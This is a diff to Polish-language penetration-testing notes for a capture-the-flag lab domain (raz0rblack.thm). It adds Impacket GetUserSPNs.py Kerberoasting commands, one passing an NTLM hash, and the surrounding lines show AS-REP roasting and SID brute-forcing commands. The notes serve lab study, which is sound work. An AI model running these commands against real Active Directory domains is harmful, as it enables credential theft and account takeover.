@@ -41,6 +41,11 @@ python3.9 GetNPUsers.py domain/ -usersfile users.txt -dc-ip ip -outputfile hash.
 python3 GetNPUsers.py 'raz0rblack.thm'/ -usersfile /root/user.txt -no-pass -dc-ip 10.10.49.174 -format john
 KERBRUTE podobne do  GetNPUsers.py
 
+
+GetUserSPNs.py -dc-ip ip domain.thm/user -hashes :hash -request    np:
+python3.9 GetUserSPNs.py -dc-ip 10.10.241.139 raz0rblack.thm/lvetrova -hashes :f220d3988deb3f516c73f40ee16c431d -request
+Mozemy uzyskac Hashe innego użytkownika
+
 LOOKUPSID.PY:przeprowadza brutalne wymuszanie identyfikatorów SID systemu Windows w celu identyfikacji użytkowników/grup w zdalnym miejscu docelowym.
 lookupsid.py guest@ip
 
